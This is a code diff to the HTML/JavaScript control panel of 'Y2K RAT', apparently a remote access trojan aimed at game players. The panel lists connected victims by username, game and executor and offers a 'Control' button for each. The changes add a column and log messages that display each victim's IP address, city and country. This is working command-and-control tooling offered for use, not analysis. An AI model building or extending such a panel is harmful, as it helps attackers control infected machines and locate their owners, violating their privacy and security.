@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Y2K RAT</title>
+    <title>Y2K RAT - Enhanced Control Panel</title>
     <link rel="icon" href="https://media-assets.grailed.com/prd/listing/temp/d5b74d64cf634e308f6b0390537d4c91" type="image/png">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@300;400;600;700&display=swap');
@@ -116,7 +116,7 @@
                 <img src="https://media-assets.grailed.com/prd/listing/temp/d5b74d64cf634e308f6b0390537d4c91" alt="Y2K RAT" class="logo-img">
                 <div class="logo-text">
                     <h1>Y2K RAT</h1>
-                    <p>By Y2k</p>
+                    <p>Enhanced Control Panel</p>
                 </div>
             </div>
             <div class="status-indicator">
@@ -178,12 +178,13 @@
                             <th>Game</th>
                             <th>Executor</th>
                             <th>Platform</th>
+                            <th>IP / Location</th>
                             <th>Actions</th>
                         </tr>
                     </thead>
                     <tbody id="playersBody">
                         <tr>
-                            <td colspan="9">
+                            <td colspan="10">
                                 <div class="empty-state">
                                     <div class="empty-icon">📡</div>
                                     <div class="empty-title">Initializing...</div>
@@ -334,7 +335,7 @@
                 if (newCount > oldCount) {
                     const newPlayers = playersData.filter(p => !playersData.slice(0, oldCount).find(old => old.userid === p.userid));
                     newPlayers.forEach(p => {
-                        addLog('success', `New client connected: ${p.username}`, `Executor: ${p.executor} | Game: ${p.game}`);
+                        addLog('success', `New client connected: ${p.username}`, `Executor: ${p.executor} | IP: ${p.ip} | ${p.city}, ${p.country}`);
                     });
                 } else if (newCount < oldCount) {
                     addLog('warning', `Client disconnected`, `Total clients: ${newCount}`);
@@ -347,7 +348,7 @@
                 console.error('Error:', error);
                 addLog('error', 'Connection error', 'Unable to connect to server');
                 document.getElementById('playersBody').innerHTML = `
-                    <tr><td colspan="9">
+                    <tr><td colspan="10">
                         <div class="empty-state">
                             <div class="empty-icon">⚠️</div>
                             <div class="empty-title">Connection Error</div>
@@ -373,7 +374,7 @@
             
             if (playersData.length === 0) {
                 tbody.innerHTML = `
-                    <tr><td colspan="9">
+                    <tr><td colspan="10">
                         <div class="empty-state">
                             <div class="empty-icon">📡</div>
                             <div class="empty-title">No Active Connections</div>
@@ -389,6 +390,7 @@
                 const statusText = player.status === 'online' ? '🟢 Online' : '⚫ Offline';
                 const premium = player.premium ? '<span class="badge premium">★ Premium</span>' : '—';
                 const isSelected = selectedPlayers.has(player.userid);
+                const location = `${player.city || 'Unknown'}, ${player.country || 'Unknown'}`;
                 
                 return `
                     <tr class="${isSelected ? 'selected' : ''}" data-userid="${player.userid}">
@@ -405,6 +407,12 @@
                         <td>${player.game || 'Unknown'}</td>
                         <td><span class="code-text">${player.executor || 'Unknown'}</span></td>
                         <td>${player.platform || 'Unknown'}</td>
+                        <td>
+                            <div class="player-info">
+                                <span class="player-name">${player.ip || 'Hidden'}</span>
+                                <span class="player-id">📍 ${location}</span>
+                            </div>
+                        </td>
                         <td>
                             <div class="action-buttons">
                                 <button class="action-btn" onclick="openControlModal('${player.userid}', '${player.username}')">Control</button>
